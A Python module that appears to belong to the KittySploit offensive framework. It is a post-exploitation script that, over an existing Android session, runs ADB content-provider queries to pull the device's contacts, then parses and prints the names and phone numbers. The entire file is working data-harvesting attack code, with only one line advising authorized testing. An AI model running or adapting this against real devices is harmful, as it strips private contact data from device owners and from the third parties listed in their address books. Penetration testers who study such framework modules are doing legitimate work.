from kittysploit import *
import re

class Module(Post):

    __info__ = {
        'name': 'Android Extract Contact',
        'description': 'Extract contacts from an Android device',
        'author': 'KittySploit Team',
        'session_type': SessionType.ANDROID,
    }
    def run(self):
        try:
            # Use ADB via cmd_execute (requires an android shell auto-created for android sessions).
            # We try a few common content provider queries; availability depends on Android version/permissions.
            outputs = []

            # Most useful: phone contacts (may require READ_CONTACTS permission on some builds).
            outputs.append(self.cmd_execute("content query --uri content://com.android.contacts/contacts --projection _id:display_name"))
            outputs.append(self.cmd_execute("content query --uri content://com.android.contacts/data/phones --projection display_name:data1"))
            outputs.append(self.cmd_execute("content query --uri content://contacts/phones/ --projection display_name:number"))

            combined = "\n".join(o for o in outputs if o)
            if not combined or "not connected" in combined.lower():
                print_error("Could not query contacts via ADB (no output / not connected).")
                return False

            # Detect common Android permission denial for contacts provider.
            if ("permission denial" in combined.lower()) or ("securityexception" in combined.lower()):
                print_error("Permission denied reading contacts (READ_CONTACTS/WRITE_CONTACTS required).")
                print_info("On stock Android, ADB shell cannot access contacts without appropriate permissions/privileges.")
                print_info("Test only on devices you own/are authorized to assess, and with proper consent.")
                return False

            # Very lightweight parsing: extract "display_name=" and "number=" / "data1=" pairs when present.
            names = re.findall(r"(?i)display_name=([^,\\n]+)", combined)
            numbers = re.findall(r"(?i)(?:number|data1)=([^,\\n]+)", combined)

            # If parsing fails, still print raw output (better than nothing).
            if not names and not numbers:
                print_success("Contacts (raw):")
                print_info(combined)
                return True

            # Build a simple list view.
            lines = []
            max_len = max(len(names), len(numbers))
            for i in range(max_len):
                n = names[i].strip() if i < len(names) else ""
                p = numbers[i].strip() if i < len(numbers) else ""
                if n and p:
                    lines.append(f"{n} - {p}")
                elif n:
                    lines.append(n)
                elif p:
                    lines.append(p)

            if not lines:
                print_success("Contacts (raw):")
                print_info(combined)
                return True

            print_success("Contacts:")
            for line in lines[:200]:
                print_info(f"  {line}")
            if len(lines) > 200:
                print_info(f"... ({len(lines) - 200} more)")
            return True
        except Exception as e:
            print_error(f'Error: {e}')
            return False